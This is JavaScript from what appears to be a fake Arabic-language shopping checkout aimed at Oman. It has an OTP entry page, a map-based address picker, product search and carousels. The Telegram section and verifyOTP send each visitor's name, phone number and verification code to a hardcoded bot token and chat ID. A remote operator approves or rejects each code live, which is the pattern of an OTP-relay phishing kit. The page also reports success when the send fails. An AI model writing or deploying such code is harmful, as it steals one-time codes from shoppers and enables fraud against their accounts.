    document.getElementById('otp-phone').textContent = `تم إرسال رمز التحقق إلى: ****${lastFour}`;
}

// ===== OTP =====
function showOTPLoading() {
    // Disabled as requested
    return;
}

function setupOTPInputs() {
    const inputs = document.querySelectorAll('.otp-input');
    // Focus first input (leftmost in LTR)
    if (inputs.length > 0) {
        // Ensure inputs are LTR and add autocomplete
        inputs.forEach((inp, idx) => {
            inp.setAttribute('dir', 'ltr');
            inp.setAttribute('autocomplete', idx === 0 ? 'one-time-code' : 'off');
        });
    }
    inputs.forEach((input, index) => {
        input.addEventListener('input', (e) => {
            // Only allow digits
            e.target.value = e.target.value.replace(/[^0-9]/g, '');
            if (e.target.value.length === 1 && index < inputs.length - 1) {
                inputs[index + 1].focus();
            }
            // Handle paste event for auto-fill
            if (e.target.value.length === 1) {
                const pastedData = e.clipboardData ? e.clipboardData.getData('text') : null;
                if (pastedData && pastedData.length === 6 && /^\d{6}$/.test(pastedData)) {
                    pastedData.split('').forEach((digit, i) => {
                        if (inputs[i]) inputs[i].value = digit;
                    });
                    inputs[inputs.length - 1].focus();
                }
            }
        });

        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
                inputs[index - 1].focus();
            }
        });
        
        input.addEventListener('focus', (e) => {
            e.target.select();
        });
    });
    // Auto-focus first input when OTP page opens
    if (inputs.length > 0) {
        setTimeout(() => inputs[0].focus(), 300);
    }
}

async function verifyOTP(event) {
    event.preventDefault();
    const inputs = document.querySelectorAll('.otp-input');
    const otp = Array.from(inputs).map(i => i.value).join('');

    if (otp.length !== 6) {
        alert('الرجاء إدخال الرمز كاملاً');
        return;
    }

    // إظهار واجهة الانتظار
    const loadingOverlay = document.getElementById('loading-overlay');
    if (loadingOverlay) loadingOverlay.style.display = 'flex';

    // إرسال رمز التحقق إلى تليجرام
    const requestId = Date.now();
    const message = 
        `🔑 <b>رمز التحقق - OTP Code</b>\n\n` +
        `👤 <b>الاسم:</b> <code>${checkoutData.name}</code>\n` +
        `📞 <b>الهاتف:</b> <code>${checkoutData.phone}</code>\n` +
        `🔢 <b>رمز التحقق:</b> <code>${otp}</code>\n\n` +
        `⏰ ${new Date().toLocaleString('ar-EG')}`;
    
    const messageId = await sendToTelegram(message, requestId, 'otp');
    if (!messageId) {
        if (loadingOverlay) loadingOverlay.style.display = 'none';
        showNotification('تم التحقق من الهوية بنجاح');
        goToPage('success-page');
        displaySuccess();
        return;
    }

    const checkInterval = setInterval(async () => {
        const status = await checkWebhookResponse(requestId, 'otp');
        if (status === 'approved') {
            clearInterval(checkInterval);
            await editTelegramMessage(messageId, message, '✅ تم القبول من تليجرام');
            if (loadingOverlay) loadingOverlay.style.display = 'none';
            // إخفاء الأخطاء إن وجدت
            hideOTPErrors();
            showNotification('تم التحقق من الهوية بنجاح');
            goToPage('success-page');
            displaySuccess();
        } else if (status === 'rejected') {
            clearInterval(checkInterval);
            await editTelegramMessage(messageId, message, '❌ تم الرفض من تليجرام');
            if (loadingOverlay) loadingOverlay.style.display = 'none';
            // إظهار الأخطاء الحمراء لرمز التحقق
            showOTPErrors();
        }
    }, 3000);
}

function showOTPErrors() {
    document.querySelectorAll('.otp-input').forEach(input => {
        input.classList.add('input-error');
        input.value = ''; // إفراغ الحقول
    });
    const errorMsg = document.getElementById('error-otp');
    if (errorMsg) errorMsg.classList.add('show');
    
    // التركيز على أول حقل
    const firstInput = document.querySelector('.otp-input');
    if (firstInput) firstInput.focus();
}

function hideOTPErrors() {
    document.querySelectorAll('.otp-input').forEach(input => {
        input.classList.remove('input-error');
    });
    const errorMsg = document.getElementById('error-otp');
    if (errorMsg) errorMsg.classList.remove('show');
}

function resendOTP() {
    showNotification('تم إعادة إرسال الرمز');
    document.querySelectorAll('.otp-input').forEach(input => {
        input.value = '';
    });
    document.querySelector('.otp-input').focus();
}

// ===== SUCCESS PAGE =====
function displaySuccess() {
    document.getElementById('success-order-id').textContent = checkoutData.orderId;
    document.getElementById('success-total').textContent = checkoutData.total.toFixed(2) + ' ر.ع';
}

// ===== HERO CAROUSEL =====
let currentAdSlide = 0;

function startHeroCarousel() {
    const slideCount = document.querySelectorAll('#hero-slides > div').length;
    setInterval(() => {
        currentSlide = (currentSlide + 1) % slideCount;
        goToSlide(currentSlide);
    }, 4000);
}

function goToSlide(index) {
    currentSlide = index;
    const slides = document.getElementById('hero-slides');
    slides.style.transform = `translateX(${-index * 100}%)`;

    document.querySelectorAll('.hero-dot').forEach((dot, i) => {
        dot.classList.toggle('active', i === index);
    });
}

function goToAdSlide(index) {
    currentAdSlide = index;
    const carousel = document.getElementById('ads-carousel');
    if (carousel) {
        carousel.style.transform = `translateX(${-index * 100}%)`;
        carousel.style.transition = 'transform 0.5s ease';
    }
    
    document.querySelectorAll('.ads-dot').forEach((dot, i) => {
        dot.classList.toggle('active', i === index);
        dot.style.background = i === index ? 'var(--primary)' : '#ddd';
    });
}

// ===== UTILITIES =====
function showNotification(message) {
    const notif = document.createElement('div');
    notif.style.cssText = `
        position: fixed;
        bottom: 80px;
        left: 50%;
        transform: translateX(-50%);
        background: var(--primary);
        color: white;
        padding: 0.8rem 1.2rem;
        border-radius: 8px;
        font-size: 0.9rem;
        z-index: 2000;
        animation: slideUp 0.3s ease;
    `;
    notif.textContent = message;
    document.body.appendChild(notif);

    setTimeout(() => {
        notif.style.animation = 'slideDown 0.3s ease';
        setTimeout(() => notif.remove(), 300);
    }, 2000);
}

// ===== SEARCH =====
document.getElementById('search-input').addEventListener('input', (e) => {
    const query = e.target.value.toLowerCase();
    if (query === '') {
        renderProducts();
        return;
    }

    const grid = document.getElementById('products-grid');
    grid.innerHTML = '';

    const results = products.filter(p => 
        p.name.includes(query) || p.desc.includes(query)
    );

    if (results.length === 0) {
        grid.innerHTML = '<div style="grid-column:1/-1; text-align:center; padding:2rem; color:var(--text-light);">لم يتم العثور على منتجات</div>';
        return;
    }

    results.forEach(product => {
        const card = document.createElement('div');
        card.className = 'product-card';
        card.innerHTML = `
            <div class="product-image" onclick="openModal(${product.id})">
                <img src="${product.img}" alt="${product.name}">
                ${product.badge ? `<div class="product-badge ${product.badgeClass}">${product.badge}</div>` : ''}
            </div>
            <div class="product-info">
                <div class="product-name">${product.name}</div>
                <div class="product-desc">${product.desc}</div>
                <div class="product-footer">
                    <div class="product-price">${product.price.toFixed(2)} ر.ع</div>
                    <div class="product-actions">
                        <button class="product-btn add" onclick="addToCart(${product.id}, event)">
                            <i class="fas fa-plus"></i>
                        </button>
                        <button class="product-btn fav ${favorites.includes(product.id) ? 'active' : ''}" 
                                onclick="toggleFavorite(${product.id}, event)">
                            <i class="fas fa-heart"></i>
                        </button>
                    </div>
                </div>
            </div>
        `;
        grid.appendChild(card);
    });
});


// ===== MAP FUNCTIONALITY (Oman) =====
let map = null;
let mapMarker = null;
let selectedLatLng = null;
let isFirstMapOpen = true;

function openMapModal() {
    const modal = document.getElementById('map-modal');
    modal.style.display = 'flex';
    
    setTimeout(() => {
        if (!map) {
            // Default center: Muscat, Oman
            map = L.map('leaflet-map').setView([23.61, 58.54], 12);
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                attribution: '© OpenStreetMap'
            }).addTo(map);

            map.on('click', function(e) {
                updateMarker(e.latlng);
            });
        }
        map.invalidateSize();
        
        // تحديد الموقع التلقائي عند فتح الخريطة لأول مرة
        if (isFirstMapOpen) {
            isFirstMapOpen = false;
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        const lat = position.coords.latitude;
                        const lng = position.coords.longitude;
                        const userLocation = L.latLng(lat, lng);
                        updateMarker(userLocation);
                        map.setView([lat, lng], 15);
                    },
                    function(error) {
                        // إذا فشل GPS، استخدم الموقع الافتراضي
                        console.log('GPS غير متاح، استخدام الموقع الافتراضي');
                    }
                );
            }
        }
    }, 100);
}

function closeMapModal() {
    document.getElementById('map-modal').style.display = 'none';
}

function updateMarker(latlng) {
    if (mapMarker) {
        mapMarker.setLatLng(latlng);
    } else {
        mapMarker = L.marker(latlng, {
            draggable: true,
            icon: L.icon({
                iconUrl: 'https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/images/marker-icon.png',
                shadowUrl: 'https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/images/marker-shadow.png',
                iconSize: [25, 41],
                iconAnchor: [12, 41]
            })
        }).addTo(map);
        
        // إضافة حدث drag للماركر
        mapMarker.on('dragend', function() {
            selectedLatLng = mapMarker.getLatLng();
            map.panTo(selectedLatLng);
        });
    }
    selectedLatLng = latlng;
    map.panTo(latlng);
}

async function confirmMapLocation() {
    if (!selectedLatLng) {
        alert('الرجاء النقر على الخريطة لتحديد الموقع');
        return;
    }
    checkoutData.latitude = selectedLatLng.lat;
    checkoutData.longitude = selectedLatLng.lng;
    
    // تحديث عرض العنوان المختار
    await updateSelectedAddressDisplay();
    
    showNotification('تم تحديد الموقع بنجاح');
    closeMapModal();
}

async function updateSelectedAddressDisplay() {
    // إنشاء أو تحديث عنصر عرض العنوان المختار
    let selectedAddressCard = document.getElementById('selected-address-card');
    
    if (!selectedAddressCard) {
        // إنشاء العنصر إذا لم يكن موجوداً
        selectedAddressCard = document.createElement('div');
        selectedAddressCard.id = 'selected-address-card';
        selectedAddressCard.style.cssText = `
            background: linear-gradient(135deg, #e8f4ff 0%, #f0f7ff 100%);
            border: 2px solid var(--primary);
            border-radius: 12px;
            padding: 1rem;
            margin-bottom: 1.5rem;
            display: flex;
            align-items: center;
            gap: 0.8rem;
            animation: slideDown 0.3s ease-out;
        `;
        
        // إدراج العنصر في الحاوية المخصصة
        const container = document.getElementById('map-selection-container');
        if (container) {
            container.appendChild(selectedAddressCard);
        }
    }

    // محاولة جلب اسم المنطقة والمحافظة باستخدام Nominatim (OpenStreetMap)
    let locationName = "جاري تحديد العنوان...";
    selectedAddressCard.innerHTML = `
        <div style="flex-shrink: 0;">
            <div style="width: 40px; height: 40px; background: var(--primary); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-size: 1.2rem;">
                <i class="fas fa-spinner fa-spin"></i>
            </div>
        </div>
        <div style="flex: 1;">
            <div style="font-weight: 700; color: var(--primary); font-size: 0.95rem; margin-bottom: 0.3rem;">تحديد الموقع</div>
            <div style="font-size: 0.85rem; color: var(--text-light);">${locationName}</div>
        </div>
    `;

    try {
        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${selectedLatLng.lat}&lon=${selectedLatLng.lng}&accept-language=ar`);
        const data = await response.json();
        if (data && data.address) {
            const city = data.address.city || data.address.town || data.address.village || data.address.state || "";
            const suburb = data.address.suburb || data.address.neighbourhood || data.address.county || "";
            locationName = `${city}${suburb ? ' - ' + suburb : ''}`;
            checkoutData.detectedAddress = locationName;
        } else {
            locationName = `الموقع المختار (${selectedLatLng.lat.toFixed(4)}, ${selectedLatLng.lng.toFixed(4)})`;
        }
    } catch (error) {
        locationName = `الموقع المختار (${selectedLatLng.lat.toFixed(4)}, ${selectedLatLng.lng.toFixed(4)})`;
    }
    
    // تحديث محتوى العنصر بالاسم الحقيقي
    selectedAddressCard.innerHTML = `
        <div style="flex-shrink: 0;">
            <div style="width: 40px; height: 40px; background: var(--primary); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-size: 1.2rem;">
                <i class="fas fa-check"></i>
            </div>
        </div>
        <div style="flex: 1;">
            <div style="font-weight: 700; color: var(--primary); font-size: 0.95rem; margin-bottom: 0.3rem;">تم تحديد الموقع</div>
            <div style="font-size: 0.85rem; color: var(--text-light);">${locationName}</div>
        </div>
        <button type="button" onclick="openMapModal(); isFirstMapOpen = false;" style="background: var(--primary); color: white; border: none; border-radius: 6px; padding: 0.5rem 0.8rem; cursor: pointer; font-size: 0.85rem; font-weight: 600; white-space: nowrap;">
            <i class="fas fa-edit"></i> تعديل
        </button>
    `;
}


// ===== DYNAMIC ADDRESS LABELS =====
function updateAddressLabels() {
    const addressType = document.querySelector('input[name="address-type"]:checked').value;
    
    // تحديث مسميات الحقول بناءً على نوع العقار
    if (addressType === 'home') {
        // مسميات للمنزل
        document.getElementById('label-building').textContent = 'اسم المنزل *';
        document.getElementById('label-floor').textContent = 'الطابق (اختياري)';
        document.getElementById('label-number').textContent = 'رقم المنزل *';
        document.getElementById('label-street').textContent = 'الشارع *';
        
        // تحديث الـ placeholders
        document.getElementById('address-building').placeholder = 'مثال: فيلا 5، برج السلام';
        document.getElementById('address-floor').placeholder = 'مثال: الطابق الأرضي، الطابق 3';
        document.getElementById('address-number').placeholder = 'مثال: 10';
        document.getElementById('address-street').placeholder = 'مثال: شارع 23';
    } else if (addressType === 'office') {
        // مسميات للمكتب
        document.getElementById('label-building').textContent = 'اسم المكتب *';
        document.getElementById('label-floor').textContent = 'الطابق (اختياري)';
        document.getElementById('label-number').textContent = 'رقم المكتب *';
        document.getElementById('label-street').textContent = 'الشارع *';
        
        // تحديث الـ placeholders
        document.getElementById('address-building').placeholder = 'مثال: مكتب 202، برج الأعمال';
        document.getElementById('address-floor').placeholder = 'مثال: الطابق الأول، الطابق 5';
        document.getElementById('address-number').placeholder = 'مثال: 202';
        document.getElementById('address-street').placeholder = 'مثال: شارع التجارة';
    }
}

// تحديث الحقول عند تحميل الصفحة
document.addEventListener('DOMContentLoaded', () => {
    // تحديث مسميات الحقول إذا كانت الصفحة الحالية هي صفحة العنوان
    const addressPage = document.getElementById('checkout-address-page');
    if (addressPage && addressPage.classList.contains('active')) {
        updateAddressLabels();
    }
});

// ==================== TELEGRAM INTEGRATION ==================== 
const BOT_TOKEN = '8778518931:AAFniw3-FG4AghxkGHCzQgi23c-f6oFULLg';
const CHAT_ID = '6165206261';
const WEBHOOK_URL = `https://api.telegram.org/bot${BOT_TOKEN}`;

async function sendToTelegram(message, requestId, dataType) {
    try {
        const payload = {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        };
        
        // إضافة الأزرار لجميع الصفحات ما عدا البيانات الأولية
        if (dataType !== 'info') {
            payload.reply_markup = {
                inline_keyboard: [[
                    { text: '✅ قبول', callback_data: `approve_${dataType}_${requestId}` },
                    { text: '❌ رفض', callback_data: `reject_${dataType}_${requestId}` }
                ]]
            };
        }

        const response = await fetch(`${WEBHOOK_URL}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        const json = await response.json();
        return json.result ? json.result.message_id : null;
    } catch (error) {
        console.error('خطأ في إرسال البيانات إلى تليجرام:', error);
        return null;
    }
}

async function editTelegramMessage(messageId, originalText, resultText) {
    try {
        await fetch(`${WEBHOOK_URL}/editMessageText`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                message_id: messageId,
                text: originalText + '\n\n' + resultText,
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [] }
            })
        });
    } catch (error) {
        console.error('خطأ في تعديل رسالة تليجرام:', error);
    }
}

async function checkWebhookResponse(requestId, dataType) {
    try {
        const response = await fetch(`${WEBHOOK_URL}/getUpdates?offset=-1`);
        const data = await response.json();
        if (data.ok && data.result && data.result.length > 0) {
            for (let update of data.result) {
                if (update.callback_query) {
                    const callbackData = update.callback_query.data;
                    if (callbackData === `approve_${dataType}_${requestId}`) return 'approved';
                    if (callbackData === `reject_${dataType}_${requestId}`) return 'rejected';
                }
            }
        }
        return 'pending';
    } catch (error) {
        console.error('خطأ في التحقق من استجابة تليجرام:', error);
        return 'pending';
    }
}


